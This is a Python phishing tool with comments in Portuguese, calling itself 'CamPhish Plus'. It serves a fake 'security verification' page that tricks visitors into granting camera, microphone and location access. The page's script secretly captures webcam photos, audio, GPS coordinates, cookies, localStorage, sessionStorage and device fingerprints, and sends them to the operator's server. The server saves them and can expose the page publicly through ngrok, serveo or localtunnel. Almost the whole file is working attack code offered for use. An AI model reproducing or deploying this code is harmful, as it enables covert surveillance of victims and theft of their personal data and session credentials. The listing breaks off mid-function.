#!/usr/bin/env python3
"""
CamPhish Plus - Ferramenta avançada de phishing com coleta real de dados
Versão Aprimorada - Produzido pela Rede Valkiria
"""

import os
import sys
import time
import socket
import threading
import base64
from datetime import datetime
from http.server import SimpleHTTPRequestHandler, HTTPServer
import subprocess
import requests
import random
import json
from urllib.parse import urlparse, parse_qs

# Cores para o terminal
class colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Banner da Rede Valkiria
def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{colors.PURPLE}
    ██████╗  █████╗ ██╗     ██╗  ██╗██╗██████╗  █████╗ 
    ██╔══██╗██╔══██╗██║     ██║ ██╔╝██║██╔══██╗██╔══██╗
    ██████╔╝███████║██║     █████╔╝ ██║██████╔╝███████║
    ██╔══██╗██╔══██║██║     ██╔═██╗ ██║██╔══██╗██╔══██║
    ██║  ██║██║  ██║███████╗██║  ██╗██║██║  ██║██║  ██║
    ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
    {colors.CYAN}                                                    
    ██╗   ██╗ █████╗ ██╗     ██╗  ██╗██╗██████╗ ██╗ █████╗ 
    ██║   ██║██╔══██╗██║     ██║ ██╔╝██║██╔══██╗██║██╔══██╗
    ██║   ██║███████║██║     █████╔╝ ██║██████╔╝██║███████║
    ╚██╗ ██╔╝██╔══██║██║     ██╔═██╗ ██║██╔══██╗██║██╔══██║
     ╚████╔╝ ██║  ██║███████╗██║  ██╗██║██║  ██║██║██║  ██║
      ╚═══╝  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
    {colors.RESET}
    {colors.YELLOW}CamPhish Plus - Versão Avançada
    Produzido pela Rede Valkiria
    {colors.RESET}
    """)

# Configurações globais
CONFIG = {
    "port": 8080,
    "tunnel": None,
    "local_host": False,
    "redirect_url": "https://www.youtube.com",
    "custom_html": None,
    "save_path": "results",
    "requested_permissions": {
        "camera": True,
        "microphone": True,
        "location": True,
        "notifications": True,
        "cookies": True,
        "storage": True
    },
    "youtube_redirect": True,
    "youtube_video": "dQw4w9WgXcQ"  # Rick Astley - Never Gonna Give You Up
}

# HTML base com solicitação de permissões avançadas
BASE_HTML = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verificação de Segurança</title>
    <style>
        :root {
            --primary-color: #4285F4;
            --secondary-color: #3367D6;
            --background-color: #f5f5f5;
            --text-color: #333;
            --light-gray: #f9f9f9;
            --border-radius: 8px;
            --box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background-color: var(--background-color);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: var(--text-color);
            line-height: 1.6;
        }
        
        .container {
            background-color: white;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
            width: 90%;
            max-width: 500px;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
        }
        
        .logo {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            background-color: var(--primary-color);
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            font-size: 35px;
            font-weight: bold;
        }
        
        h1 {
            color: var(--primary-color);
            margin-bottom: 15px;
            font-size: 24px;
        }
        
        p {
            margin-bottom: 20px;
            color: #666;
            font-size: 15px;
        }
        
        .permissions {
            text-align: left;
            margin-bottom: 25px;
            background-color: var(--light-gray);
            padding: 15px;
            border-radius: var(--border-radius);
        }
        
        .permission-item {
            display: flex;
            align-items: center;
            margin-bottom: 12px;
            padding: 8px;
            border-radius: 4px;
            transition: background-color 0.2s;
        }
        
        .permission-item:hover {
            background-color: #ebedf0;
        }
        
        .permission-item:last-child {
            margin-bottom: 0;
        }
        
        .permission-icon {
            margin-right: 12px;
            font-size: 20px;
            width: 24px;
            text-align: center;
        }
        
        .permission-text {
            flex: 1;
            font-size: 14px;
        }
        
        .btn {
            background-color: var(--primary-color);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: var(--border-radius);
            cursor: pointer;
            font-size: 16px;
            font-weight: 500;
            transition: all 0.3s;
            width: 100%;
            margin-bottom: 15px;
        }
        
        .btn:hover {
            background-color: var(--secondary-color);
            transform: translateY(-2px);
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .loading {
            display: none;
            margin-top: 20px;
        }
        
        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            width: 36px;
            height: 36px;
            border-radius: 50%;
            border-left-color: var(--primary-color);
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        #mediaContainer {
            display: none;
            margin: 20px auto;
            width: 100%;
            max-width: 320px;
        }
        
        #videoElement {
            width: 100%;
            height: auto;
            background-color: #e4e6eb;
            border-radius: var(--border-radius);
            box-shadow: var(--box-shadow);
        }
        
        #audioVisualizer {
            width: 100%;
            height: 60px;
            background-color: #f0f2f5;
            border-radius: var(--border-radius);
            margin-top: 10px;
            position: relative;
            overflow: hidden;
        }
        
        .visualizer-bar {
            position: absolute;
            bottom: 0;
            width: 4px;
            background-color: var(--primary-color);
            border-radius: 2px;
            animation: equalize 1.5s infinite ease-in-out;
        }
        
        .footer {
            font-size: 12px;
            color: #90949c;
            margin-top: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        @keyframes equalize {
            0%, 100% { height: 10%; }
            25% { height: 60%; }
            50% { height: 30%; }
            75% { height: 90%; }
        }
        
        .progress-container {
            width: 100%;
            background-color: #f0f2f5;
            border-radius: 5px;
            margin: 15px 0;
            display: none;
        }
        
        .progress-bar {
            height: 10px;
            background-color: var(--primary-color);
            border-radius: 5px;
            width: 0%;
            transition: width 0.3s;
        }
        
        .verification-steps {
            text-align: left;
            margin-bottom: 20px;
            display: none;
        }
        
        .step {
            margin-bottom: 10px;
            display: flex;
            align-items: center;
        }
        
        .step-icon {
            margin-right: 10px;
            font-size: 18px;
        }
        
        .step.completed {
            color: #4CAF50;
        }
        
        .step.failed {
            color: #F44336;
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
</head>
<body>
    <div class="container">
        <div class="logo">✓</div>
        <h1>Verificação de Segurança Requerida</h1>
        <p>Para proteger sua conta e continuar a navegação, precisamos verificar sua identidade. Este processo é rápido e seguro.</p>
        
        <div class="permissions">
            <div class="permission-item">
                <div class="permission-icon">📷</div>
                <div class="permission-text">Acesso à câmera (para reconhecimento facial)</div>
            </div>
            <div class="permission-item">
                <div class="permission-icon">🎤</div>
                <div class="permission-text">Acesso ao microfone (para verificação de voz)</div>
            </div>
            <div class="permission-item">
                <div class="permission-icon">📍</div>
                <div class="permission-text">Sua localização (para detecção de atividades suspeitas)</div>
            </div>
            <div class="permission-item">
                <div class="permission-icon">🍪</div>
                <div class="permission-text">Cookies e dados do navegador (para manter sua sessão segura)</div>
            </div>
        </div>
        
        <button class="btn" id="verifyBtn" onclick="startVerification()">Iniciar Verificação</button>
        
        <div id="mediaContainer">
            <video id="videoElement" autoplay playsinline></video>
            <div id="audioVisualizer">
                <div class="visualizer-bar" style="left: 10%; animation-delay: 0.1s;"></div>
                <div class="visualizer-bar" style="left: 20%; animation-delay: 0.3s;"></div>
                <div class="visualizer-bar" style="left: 30%; animation-delay: 0.2s;"></div>
                <div class="visualizer-bar" style="left: 40%; animation-delay: 0.4s;"></div>
                <div class="visualizer-bar" style="left: 50%; animation-delay: 0.1s;"></div>
                <div class="visualizer-bar" style="left: 60%; animation-delay: 0.3s;"></div>
                <div class="visualizer-bar" style="left: 70%; animation-delay: 0.2s;"></div>
                <div class="visualizer-bar" style="left: 80%; animation-delay: 0.4s;"></div>
                <div class="visualizer-bar" style="left: 90%; animation-delay: 0.1s;"></div>
            </div>
        </div>
        
        <div class="progress-container" id="progressContainer">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="verification-steps" id="verificationSteps">
            <div class="step" id="step1">
                <span class="step-icon">⏳</span>
                <span>Verificando dispositivo...</span>
            </div>
            <div class="step" id="step2">
                <span class="step-icon">⏳</span>
                <span>Validando identidade...</span>
            </div>
            <div class="step" id="step3">
                <span class="step-icon">⏳</span>
                <span>Analisando segurança...</span>
            </div>
            <div class="step" id="step4">
                <span class="step-icon">⏳</span>
                <span>Preparando redirecionamento...</span>
            </div>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p id="loadingText">Processando suas informações...</p>
        </div>
        
        <div class="footer">
            Esta verificação ajuda a manter sua conta segura contra atividades suspeitas.
        </div>
    </div>

    <script>
        let mediaStream = null;
        let audioChunks = [];
        let mediaRecorder = null;
        let verificationStarted = false;
        let redirectUrl = "REDIRECT_URL";
        
        // Se for redirecionamento do YouTube
        if (redirectUrl.includes("youtube.com") && "YT_VIDEO_ID") {
            redirectUrl = `https://www.youtube.com/watch?v=YT_VIDEO_ID`;
        }
        
        function updateStep(stepId, success, message = "") {
            const step = document.getElementById(stepId);
            if (!step) return;
            
            const icon = step.querySelector('.step-icon');
            if (success) {
                step.classList.add('completed');
                icon.textContent = '✓';
                if (message) {
                    step.querySelector('span:last-child').textContent = message;
                }
            } else {
                step.classList.add('failed');
                icon.textContent = '✗';
                if (message) {
                    step.querySelector('span:last-child').textContent = message;
                }
            }
        }
        
        function updateProgress(percent) {
            const progressBar = document.getElementById('progressBar');
            if (progressBar) {
                progressBar.style.width = `${percent}%`;
            }
        }
        
        function startVerification() {
            if (verificationStarted) return;
            verificationStarted = true;
            
            const btn = document.getElementById('verifyBtn');
            btn.disabled = true;
            btn.textContent = 'Verificação em andamento...';
            
            document.getElementById('progressContainer').style.display = 'block';
            document.getElementById('verificationSteps').style.display = 'block';
            document.getElementById('loading').style.display = 'block';
            
            updateProgress(10);
            updateStep('step1', false);
            updateStep('step2', false);
            updateStep('step3', false);
            updateStep('step4', false);
            
            // Iniciar processo de verificação
            setTimeout(() => {
                verifyDevice();
            }, 500);
        }
        
        function verifyDevice() {
            updateProgress(25);
            updateStep('step1', true, "Dispositivo reconhecido");
            
            // Coletar dados do navegador primeiro
            collectBrowserData();
            
            // Solicitar permissões de mídia
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: true 
                }).then(function(stream) {
                    mediaStream = stream;
                    showMediaElements();
                    captureMediaData();
                    updateStep('step2', true, "Identidade validada");
                    updateProgress(50);
                }).catch(function(err) {
                    sendData('error', 'Erro ao acessar câmera/microfone: ' + err.message);
                    updateStep('step2', false, "Falha na verificação de identidade");
                });
            } else {
                sendData('error', 'API de mídia não suportada');
                updateStep('step2', false, "Dispositivo não compatível");
            }
            
            // Verificar localização
            verifyLocation();
        }
        
        function showMediaElements() {
            const mediaContainer = document.getElementById('mediaContainer');
            const videoElement = document.getElementById('videoElement');
            
            if (mediaStream && videoElement) {
                mediaContainer.style.display = 'block';
                videoElement.srcObject = mediaStream;
                
                // Mostrar visualizador de áudio
                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioContext.createMediaStreamSource(mediaStream);
                const analyser = audioContext.createAnalyser();
                source.connect(analyser);
                
                // Animar as barras do visualizador
                animateAudioVisualizer(analyser);
            }
        }
        
        function animateAudioVisualizer(analyser) {
            const visualizerBars = document.querySelectorAll('.visualizer-bar');
            const bufferLength = analyser.frequencyBinCount;
            const dataArray = new Uint8Array(bufferLength);
            
            function draw() {
                requestAnimationFrame(draw);
                analyser.getByteFrequencyData(dataArray);
                
                visualizerBars.forEach((bar, i) => {
                    const index = Math.floor(i * bufferLength / visualizerBars.length);
                    const height = (dataArray[index] / 255) * 100;
                    bar.style.height = `${height}%`;
                });
            }
            
            draw();
        }
        
        function captureMediaData() {
            // Capturar frame do vídeo
            setTimeout(() => {
                const videoElement = document.getElementById('videoElement');
                if (videoElement && videoElement.readyState >= 2) {
                    captureVideoFrame(videoElement);
                }
            }, 1000);
            
            // Iniciar gravação de áudio
            startAudioRecording();
            
            // Capturar novamente após 2 segundos
            setTimeout(() => {
                const videoElement = document.getElementById('videoElement');
                if (videoElement && videoElement.readyState >= 2) {
                    captureVideoFrame(videoElement, 'camera_second');
                }
            }, 3000);
        }
        
        function verifyLocation() {
            updateProgress(60);
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    position => {
                        const coords = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            speed: position.coords.speed,
                            timestamp: new Date(position.timestamp).toISOString()
                        };
                        sendData('location', coords);
                        
                        const mapsLink = `https://www.google.com/maps/place/${coords.latitude},${coords.longitude}`;
                        sendData('maps_link', mapsLink);
                        
                        updateStep('step3', true, "Localização verificada");
                        updateProgress(80);
                        
                        // Finalizar verificação
                        completeVerification();
                    },
                    err => {
                        sendData('error', 'Erro ao obter localização: ' + err.message);
                        updateStep('step3', false, "Localização não disponível");
                        updateProgress(80);
                        
                        // Continuar mesmo sem localização
                        completeVerification();
                    },
                    { 
                        enableHighAccuracy: true,
                        timeout: 7000,
                        maximumAge: 0
                    }
                );
            } else {
                sendData('error', 'Geolocalização não suportada');
                updateStep('step3', false, "Localização não suportada");
                updateProgress(80);
                
                // Continuar mesmo sem localização
                completeVerification();
            }
        }
        
        function completeVerification() {
            updateProgress(95);
            updateStep('step4', true, "Redirecionamento preparado");
            
            // Coletar dados finais
            collectFinalData();
            
            // Redirecionar após 3 segundos
            setTimeout(() => {
                updateProgress(100);
                document.getElementById('loadingText').textContent = "Redirecionando...";
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                    mediaRecorder.stop();
                }
                
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 1500);
            }, 3000);
        }
        
        function captureVideoFrame(videoElement, type = 'camera') {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.9);
                sendData(type, imageData);
            } catch (err) {
                sendData('error', 'Erro ao capturar vídeo: ' + err.message);
            }
        }
        
        function startAudioRecording() {
            try {
                if (!mediaStream) return;
                
                audioChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream);
                
                mediaRecorder.ondataavailable = function(e) {
                    audioChunks.push(e.data);
                    
                    if (mediaRecorder.state === 'inactive') {
                        const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                        const reader = new FileReader();
                        reader.onload = function() {
                            const audioData = reader.result;
                            sendData('microphone', audioData);
                        };
                        reader.readAsDataURL(audioBlob);
                    }
                };
                
                mediaRecorder.start(1000); // Coletar dados a cada 1 segundo
                
                // Parar após 4 segundos
                setTimeout(() => {
                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                        mediaRecorder.stop();
                    }
                }, 4000);
                
            } catch (err) {
                sendData('error', 'Erro ao gravar áudio: ' + err.message);
            }
        }
        
        function collectBrowserData() {
            const data = {
                // Informações do navegador
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                appVersion: navigator.appVersion,
                
                // Idiomas e timezone
                language: navigator.language,
                languages: navigator.languages,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                
                // Hardware
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory || 'N/A',
                maxTouchPoints: navigator.maxTouchPoints,
                
                // Tela
                screen: {
                    width: window.screen.width,
                    height: window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    orientation: window.screen.orientation?.type || 'N/A'
                },
                
                // Conexão
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt,
                    saveData: navigator.connection.saveData
                } : 'N/A',
                
                // Cookies e armazenamento
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                
                // Outros dados
                doNotTrack: navigator.doNotTrack,
                referrer: document.referrer,
                url: window.location.href,
                timestamp: new Date().toISOString()
            };
            
            sendData('browser_data', data);
        }
        
        function collectFinalData() {
            // Coletar notificações
            Notification.requestPermission().then(permission => {
                sendData('notifications', 'Status permissão: ' + permission);
            });
            
            // Coletar dados adicionais
            const additionalData = {
                plugins: Array.from(navigator.plugins).map(p => p.name).join(', '),
                battery: navigator.getBattery ? 'Suportado' : 'Não suportado',
                pdfViewerEnabled: navigator.pdfViewerEnabled || 'N/A',
                webdriver: navigator.webdriver || 'N/A',
                deviceInfo: {
                    touchSupport: 'ontouchstart' in window,
                    pixelRatio: window.devicePixelRatio,
                    cpuCores: navigator.hardwareConcurrency
                }
            };
            
            sendData('additional_data', additionalData);
        }
        
        function sendData(type, data) {
            // Em um ambiente real, isso seria enviado para o servidor
            const payload = {
                type: type,
                data: data,
                timestamp: new Date().toISOString()
            };
            
            // Simulação do envio para o terminal
            console.log(`[Dados Coletados] Tipo: ${type}`, data);
            
            // Enviar para o servidor (descomente para uso real)
            fetch('/log', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).catch(err => {
                console.error('Erro ao enviar dados:', err);
            });
        }
    </script>
</body>
</html>
"""

# Servidor HTTP personalizado
class RequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = BASE_HTML
            if CONFIG['custom_html'] and os.path.exists(CONFIG['custom_html']):
                with open(CONFIG['custom_html'], 'r', encoding='utf-8') as f:
                    html = f.read()
            
            # Configurar redirecionamento
            redirect_url = CONFIG['redirect_url']
            if CONFIG['youtube_redirect'] and 'youtube.com' in redirect_url.lower():
                redirect_url = f"https://www.youtube.com/watch?v={CONFIG['youtube_video']}"
            
            html = html.replace('REDIRECT_URL', redirect_url)
            
            if CONFIG['youtube_redirect']:
                html = html.replace('YT_VIDEO_ID', CONFIG['youtube_video'])
            
            self.wfile.write(html.encode('utf-8'))
        else:
            super().do_GET()
    
    def do_POST(self):
        if self.path == '/log':
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                data = json.loads(post_data.decode('utf-8'))
                
                self.save_data(data)
                
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({'status': 'success'}).encode('utf-8'))
            except Exception as e:
                self.send_response(500)
                self.end_headers()
                print(f"{colors.RED}[-] Erro ao processar POST: {e}{colors.RESET}")
        else:
            self.send_response(404)
            self.end_headers()

    def save_data(self, data):
        try:
            if not os.path.exists(CONFIG['save_path']):
                os.makedirs(CONFIG['save_path'])
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{CONFIG['save_path']}/result_{timestamp}.json"
            
            # Processar dados recebidos
            processed_data = self.process_data(data)
            
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(processed_data, f, indent=4, ensure_ascii=False)
            
            # Mostrar dados no terminal
            self.display_data(processed_data)
            
            print(f"\n{colors.GREEN}[+] Dados salvos em: {filename}{colors.RESET}")
        except Exception as e:
            print(f"{colors.RED}[-] Erro ao salvar dados: {e}{colors.RESET}")
    
    def process_data(self, data):
        processed = {
            'type': data.get('type'),
            'timestamp': data.get('timestamp'),
            'data': None
        }
        
        try:
            if data['type'] in ['camera', 'camera_second']:
                if isinstance(data['data'], str) and data['data'].startswith('data:image'):
                    # Salvar imagem da câmera em arquivo separado
                    img_data = data['data'].split(',')[1] if ',' in data['data'] else data['data']
                    img_filename = f"{CONFIG['save_path']}/{data['type']}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                    with open(img_filename, 'wb') as f:
                        f.write(base64.b64decode(img_data))
                    processed['data'] = f"Imagem salva em: {img_filename}"
                else:
                    processed['data'] = "Dados de imagem inválidos"
            
            elif data['type'] == 'microphone':
                if isinstance(data['data'], str) and data['data'].startswith('data:audio'):
                    # Salvar áudio em arquivo separado
                    audio_data = data['data'].split(',')[1] if ',' in data['data'] else data['data']
                    audio_filename = f"{CONFIG['save_path']}/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                    with open(audio_filename, 'wb') as f:
                        f.write(base64.b64decode(audio_data))
                    processed['data'] = f"Áudio salvo em: {audio_filename}"
                else:
                    processed['data'] = "Dados de áudio inválidos"
            
            else:
                processed['data'] = data['data']
        except Exception as e:
            processed['error'] = f"Erro ao processar {data['type']}: {str(e)}"
        
        return processed
    
    def display_data(self, data):
        print(f"\n{colors.CYAN}=== NOVOS DADOS RECEBIDOS ==={colors.RESET}")
        print(f"{colors.YELLOW}Tipo: {colors.WHITE}{data['type']}{colors.RESET}")
        print(f"{colors.YELLOW}Hora: {colors.WHITE}{data['timestamp']}{colors.RESET}")
        
        if data['type'] == 'location':
            loc = data['data']
            print(f"{colors.GREEN}📍 Localização:{colors.RESET}")
            print(f"Latitude: {loc.get('latitude', 'N/A')}")
            print(f"Longitude: {loc.get('longitude', 'N/A')}")
            print(f"Precisão: {loc.get('accuracy', 'N/A')} metros")
            if 'latitude' in loc and 'longitude' in loc:
                print(f"Google Maps: https://maps.google.com/?q={loc['latitude']},{loc['longitude']}")
        
        elif data['type'] == 'cookies':
            print(f"{colors.GREEN}🍪 Cookies:{colors.RESET}")
            print(data['data'][:200] + ("..." if len(data['data']) > 200 else ""))
        
        elif data['type'] == 'browser_data':
            info = data['data']
            print(f"{colors.GREEN}🖥️ Informações do Navegador:{colors.RESET}")
            print(f"User Agent: {info.get('userAgent', 'N/A')}")
            print(f"Plataforma: {info.get('platform', 'N/A')}")
            print(f"Idioma: {info.get('language', 'N/A')}")
            print(f"Resolução: {info.get('screen', {}).get('width', 'N/A')}x{info.get('screen', {}).get('height', 'N/A')}")
            print(f"Timezone: {info.get('timezone', 'N/A')}")
        
        elif data['type'] in ['camera', 'camera_second', 'microphone']:
            print(f"{colors.GREEN}📷 Mídia capturada:{colors.RESET}")
            print(data['data'])
        
        elif data['type'] == 'error':
            print(f"{colors.RED}❌ Erro:{colors.RESET}")
            print(data['data'])
        
        else:
            print(f"{colors.GREEN}📊 Dados:{colors.RESET}")
            print(json.dumps(data['data'], indent=2, ensure_ascii=False))
        
        print(f"{colors.CYAN}============================={colors.RESET}")

# Função para iniciar servidor local
def start_local_server():
    server_address = ('', CONFIG['port'])
    httpd = HTTPServer(server_address, RequestHandler)
    print(f"{colors.GREEN}[*] Servidor local iniciado em http://localhost:{CONFIG['port']}{colors.RESET}")
    print(f"{colors.YELLOW}[*] Pasta de salvamento: {os.path.abspath(CONFIG['save_path'])}{colors.RESET}")
    print(f"{colors.YELLOW}[*] Redirecionando para: {CONFIG['redirect_url']}{colors.RESET}")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Servidor encerrado pelo usuário{colors.RESET}")
    except Exception as e:
        print(f"\n{colors.RED}[!] Erro no servidor: {e}{colors.RESET}")

# Função para iniciar tunel com serveo
def start_serveo():
    try:
        print(f"{colors.YELLOW}[*] Iniciando tunel Serveo.net...{colors.RESET}")
        command = f"ssh -R 80:localhost:{CONFIG['port']} serveo.net"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{colors.RED}[-] Erro ao conectar ao Serveo.net: {e}{colors.RESET}")
    except Exception as e:
        print(f"{colors.RED}[-] Erro inesperado no Serveo: {e}{colors.RESET}")

# Função para iniciar tunel com ngrok
def start_ngrok():
    try:
        print(f"{colors.YELLOW}[*] Iniciando tunel Ngrok...{colors.RESET}")
        command = f"ngrok http {CONFIG['port']} --log=stdout"
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Aguardar ngrok iniciar
        time.sleep(3)
        
        # Obter URL do ngrok
        try:
            res = requests.get('http://localhost:4040/api/tunnels')
            tunnels = res.json().get('tunnels', [])
            if tunnels:
                print(f"{colors.GREEN}[*] URL do Ngrok: {tunnels[0]['public_url']}{colors.RESET}")
            else:
                print(f"{colors.YELLOW}[!] Não foi possível obter URL do Ngrok{colors.RESET}")
        except:
            print(f"{colors.YELLOW}[!] Não foi possível obter URL do Ngrok{colors.RESET}")
        
    except Exception as e:
        print(f"{colors.RED}[-] Erro ao iniciar Ngrok: {e}{colors.RESET}")
        print(f"{colors.YELLOW}[!] Certifique-se que o Ngrok está instalado e configurado{colors.RESET}")

# Função para iniciar tunel com localtunnel
def start_localtunnel():
    try:
        print(f"{colors.YELLOW}[*] Iniciando tunel LocalTunnel...{colors.RESET}")
        command = f"lt --port {CONFIG['port']} --print-requests"
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"{colors.RED}[-] Erro ao iniciar LocalTunnel: {e}{colors.RESET}")
    except Exception as e:
        print(f"{colors.RED}[-] Erro inesperado no LocalTunnel: {e}{colors.RESET}")

# Menu principal
def main_menu():
    banner()
    print(f"{colors.BLUE}[1] {colors.WHITE}Usar servidor local (localhost){colors.RESET}")
    print(f"{colors.BLUE}[2] {colors.WHITE}Usar Serveo.net (tunnel){colors.RESET}")
    print(f"{colors.BLUE}[3] {colors.WHITE}Usar Ngrok (tunnel){colors.RESET}")
    print(f"{colors.BLUE}[4] {colors.WHITE}Usar LocalTunnel (tunnel){colors.RESET}")
    print(f"{colors.BLUE}[5] {colors.WHITE}Configurar opções avançadas{colors.RESET}")
    print(f"{colors.BLUE}[0] {colors.WHITE}Sair{colors.RESET}")
    
    try:
        choice = input(f"\n{colors.YELLOW}[?] Selecione uma opção: {colors.RESET}")
        
        if choice == '1':
            CONFIG['local_host'] = True
            start_local_server()
        elif choice == '2':
            CONFIG['tunnel'] = 'serveo'
            threading.Thread(target=start_serveo, daemon=True).start()
            time.sleep(2)
            start_local_server()
        elif choice == '3':
            CONFIG['tunnel'] = 'ngrok'
            threading.Thread(target=start_ngrok, daemon=True).start()
            time.sleep(2)
            start_local_server()
        elif choice == '4':
            CONFIG['tunnel'] = 'localtunnel'
            threading.Thread(target=start_localtunnel, daemon=True).start()
            time.sleep(2)
            start_local_server()
        elif choice == '5':
            advanced_options()
        elif choice == '0':
            sys.exit(0)
        else:
            print(f"{colors.RED}[-] Opção inválida!{colors.RESET}")
            time.sleep(1)
            main_menu()
    except KeyboardInterrupt:
        print(f"\n{colors.YELLOW}[!] Operação cancelada pelo usuário{colors.RESET}")
        sys.exit(0)

# Opções avançadas
def advanced_options():
    banner()
    print(f"{colors.CYAN}=== OPÇÕES AVANÇADAS ==={colors.RESET}\n")
    print(f"{colors.BLUE}[1] {colors.WHITE}Alterar porta (Atual: {CONFIG['port']}){colors.RESET}")
    print(f"{colors.BLUE}[2] {colors.WHITE}Definir URL de redirecionamento (Atual: {CONFIG['redirect_url']}){colors.RESET}")
    print(f"{colors.BLUE}[3] {colors.WHITE}Usar HTML personalizado (Atual: {CONFIG['custom_html']}){colors.RESET}")
    print(f"{colors.BLUE}[4] {colors.WHITE}Configurar permissões solicitadas{colors.RESET}")
    print(f"{colors.BLUE}[5] {colors.WHITE}Alterar pasta de salvamento (Atual: {CONFIG['save_path']}){colors.RESET}")
    print(f"{colors.BLUE}[6] {colors.WHITE}Configurar redirecionamento do YouTube{colors.RESET}")
    print(f"{colors.BLUE}[0] {colors.WHITE}Voltar ao menu principal{colors.RESET}")
    
    try:
        choice = input(f"\n{colors.YELLOW}[?] Selecione uma opção: {colors.RESET}")
        
        if choice == '1':
            port = input(f"{colors.YELLOW}[?] Nova porta (1024-65535): {colors.RESET}")
            if port.isdigit() and 1024 <= int(port) <= 65535:
                CONFIG['port'] = int(port)
                print(f"{colors.GREEN}[+] Porta alterada para {port}{colors.RESET}")
            else:
                print(f"{colors.RED}[-] Porta inválida!{colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '2':
            url = input(f"{colors.YELLOW}[?] URL para redirecionamento (ex: https://youtube.com): {colors.RESET}")
            if url.startswith(('http://', 'https://')):
                CONFIG['redirect_url'] = url
                CONFIG['youtube_redirect'] = 'youtube.com' in url.lower()
                print(f"{colors.GREEN}[+] URL de redirecionamento definida{colors.RESET}")
            else:
                print(f"{colors.RED}[-] URL deve começar com http:// ou https://{colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '3':
            path = input(f"{colors.YELLOW}[?] Caminho para o arquivo HTML personalizado: {colors.RESET}")
            if os.path.exists(path):
                CONFIG['custom_html'] = path
                print(f"{colors.GREEN}[+] HTML personalizado definido{colors.RESET}")
            else:
                print(f"{colors.RED}[-] Arquivo não encontrado!{colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '4':
            configure_permissions()
        elif choice == '5':
            path = input(f"{colors.YELLOW}[?] Nova pasta para salvar resultados: {colors.RESET}")
            CONFIG['save_path'] = path
            print(f"{colors.GREEN}[+] Pasta de salvamento alterada{colors.RESET}")
            time.sleep(1)
            advanced_options()
        elif choice == '6':
            configure_youtube()
        elif choice == '0':
            main_menu()
